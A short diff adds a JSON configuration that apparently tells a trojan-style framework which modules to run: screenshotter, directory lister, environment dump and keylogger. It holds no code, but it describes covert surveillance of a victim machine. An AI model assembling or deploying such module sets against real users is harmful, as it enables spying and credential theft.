@@ -1,0 +1,14 @@
+[
+  {
+    "module" : "screenshotter"
+  },
+  {
+    "module" : "dirlister"
+  },
+  {
+    "module" : "environment"
+  },
+  {
+    "module" : "keylogger"
+  }
+]
